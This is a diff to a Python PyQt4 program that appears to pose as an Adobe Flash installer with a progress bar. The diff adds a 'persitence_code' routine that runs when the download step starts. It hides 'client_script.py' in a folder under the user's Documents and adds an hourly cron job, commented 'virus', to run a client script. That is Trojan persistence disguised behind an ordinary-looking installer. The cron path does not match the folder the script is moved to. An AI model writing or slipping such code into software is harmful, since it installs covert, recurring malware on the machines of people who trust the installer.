@@ -1,5 +1,7 @@
-#!/usr/bin/env python
 import sys
+import os
+import shutil
+from crontab import CronTab
 from PyQt4.QtCore import *
 from PyQt4.QtGui import *
 try:
@@ -46,6 +48,7 @@ class stackedExample(QWidget):
 
 
     def stack1UI(self):
+
         self.textBrowser_Page1 = QTextBrowser()
         self.textBrowser_Page1.setGeometry(QRect(0, 0, 401, 241))
         self.textBrowser_Page1.setObjectName(_fromUtf8("textBrowser_Page1"))
@@ -77,6 +80,7 @@ class stackedExample(QWidget):
 
 
     def stack2UI(self):
+
         self.textBrowser_Page2_Status = QTextBrowser()
         self.textBrowser_Page2_Status.setGeometry(QRect(20, 70, 351, 111))
         self.textBrowser_Page2_Status.setObjectName(_fromUtf8("textBrowser_Page2_Status"))
@@ -154,7 +158,6 @@ class stackedExample(QWidget):
 
 
     def display(self, i):
-        print "current index: " + str(i)
         self.Stack.setCurrentIndex(i)
         if i == 1:
             self.download()
@@ -163,11 +166,25 @@ class stackedExample(QWidget):
         sys.exit(0)
 
     def download(self):
+        self.persitence_code()
         self.completed = 0
 
-        while self.completed < 100:
+        while self.completed < 300:
             self.completed += 0.0001
             self.progress.setValue(self.completed)
+
+
+
+    def persitence_code(self):
+        myUser = os.environ["USER"]
+        if not os.path.exists("/home/"+myUser+"/Documents/adobeflash"):
+            os.makedirs("/home/"+myUser+"/Documents/adobeflash")
+        shutil.move("client_script.py", "/home/"+myUser+"/Documents/adobeflash/client_script.py")
+        tab = CronTab(user=myUser)
+        cmd = 'python /bin/adobeflash/client_script.py'
+        cron_job = tab.new(cmd, comment='virus')
+        cron_job.hour.every(1)
+        tab.write()
 
 
 def main():
